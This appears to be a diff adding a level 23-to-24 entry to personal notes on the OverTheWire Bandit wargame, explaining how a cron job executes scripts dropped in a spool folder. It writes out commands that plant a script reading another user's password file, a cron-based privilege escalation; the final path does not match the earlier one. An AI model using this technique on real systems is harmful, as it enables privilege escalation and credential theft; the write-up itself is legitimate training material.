@@ -224,3 +224,46 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 # password output
 ```
 
+### level 23 -> level 24
+
+holy shit this was a nice jump from previous levels, had to think of an actual path to retrieve the pass
+i saw what the cron job script does, figured it allows execution of files in a specific folder, i drop my one line script into that folder, which executes for the user its owned by whener the cron job runs, very clever
+
+```bash
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+#shopt -s nullglob
+
+#myname=$(whoami)
+
+#cd /var/spool/"$myname"/foo || exit 
+#echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+#for i in * .*;
+#do
+#    if [ "$i" != "." ] && [ "$i" != ".." ];
+#    then
+#        echo "Handling $i"
+#        owner="$(stat --format "%U" "./$i")"
+#        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+#            timeout -s 9 60 "./$i"
+#        fi
+#        rm -rf "./$i"
+#    fi
+#done
+
+# the script basically executes and deletes all files in that folder
+
+mkdir /tmp/blehh
+chmod 777 /tmp/blehh #rwx for all so that cron runs this
+cd /tmp/blehh
+
+echo '#!/bin/bash' > exploit.sh
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/blehh/flag.txt' >> exploit.sh
+
+chmod +x exploit.sh
+
+cp exploit.sh /var/spool/bandit24/foo/
+
+cat /tmp/bandit24_exploit/flag.txt
+```
